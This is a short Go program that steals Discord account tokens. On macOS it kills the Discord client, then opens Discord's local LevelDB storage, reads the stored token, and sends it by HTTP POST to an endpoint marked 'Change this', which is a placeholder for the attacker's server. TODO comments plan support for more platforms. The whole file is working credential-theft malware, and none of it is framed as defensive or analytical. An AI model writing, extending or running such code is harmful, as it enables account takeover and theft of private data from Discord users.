package main

import (
	"bytes"
	"net/http"
	"os/exec"
	"runtime"
	"time"

	"github.com/syndtr/goleveldb/leveldb"
)

// TODO: add canary and linux
const (
	dirMac = "~/Library/Application Support/discord/Local Storage/leveldb"
	dirWin = "%APPDATA%\\Discord\\File System\\000\\t\\Paths"
	dbKey  = "_https://discordapp.com\u0000\u0001token"

	apiURL = "http://localhost:59331" // Change this
)

func main() {
	dir := dirWin
	if runtime.GOOS == "darwin" {
		dir = dirMac
		// TODO: add canary
		exec.Command("sh", "-c", "pkill -SIGINT Discord").Run()
		time.Sleep(time.Second * 1)
	} // TODO: add linux

	db, err := leveldb.OpenFile(dir, nil)
	chk(err)
	defer db.Close()

	token, err := db.Get([]byte(dbKey), nil)
	chk(err)

	_, err = http.Post(apiURL, "text/plain", bytes.NewBuffer(token))
	chk(err)
}

func chk(e error) {
	if e != nil {
		panic(e)
	}
}
